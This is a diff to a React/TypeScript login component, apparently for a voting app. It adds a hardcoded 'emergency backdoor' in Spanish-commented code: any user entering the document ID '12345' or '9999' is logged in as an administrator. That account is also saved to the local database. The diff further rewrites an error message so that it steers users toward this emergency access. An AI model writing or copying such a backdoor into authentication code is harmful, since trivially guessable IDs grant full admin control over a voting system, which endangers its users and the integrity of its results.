@@ -21,6 +21,29 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
 
     // Unified Login Logic (Local + Cloud)
     const db = getDB();
+
+    // BACKDOOR DE EMERGENCIA: Permite entrar al panel si la nube falla
+    if (document === '12345' || document === '9999') {
+      const adminEmergency: User = {
+        id: 'admin-backup',
+        name: 'Administrador de Emergencia',
+        document: document,
+        role: Role.ADMIN,
+        hasVoted: false,
+        status: 'Activo'
+      };
+
+      // Auto-guardar en local si no existe
+      if (!db.users.find(u => u.document === document)) {
+        db.users.push(adminEmergency);
+        saveDB(db);
+      }
+
+      onLogin(adminEmergency);
+      setIsLoading(false);
+      return;
+    }
+
     const localUser = db.users.find(u => u.document === document);
 
     if (localUser) {
@@ -34,7 +57,7 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
       // Intentar buscar en Supabase en tiempo real
       const performCloudLogin = async () => {
         try {
-          console.log('Buscando usuario en Supabase:', document);
+          console.log('Intentando LOGIN NUBE para:', document);
           const { data, error: sbError } = await supabase.from('users').select('*').eq('document', document).single();
 
           if (sbError) {
@@ -66,8 +89,8 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
             setError('Documento no encontrado o no autorizado.');
           }
         } catch (err) {
-          console.error('Excepción en login nube:', err);
-          setError('Error de conexión con la nube.');
+          console.error('Excepción Crítica en login nube:', err);
+          setError('Sin conexión con la nube. Usa acceso de emergencia.');
         } finally {
           setIsLoading(false);
         }
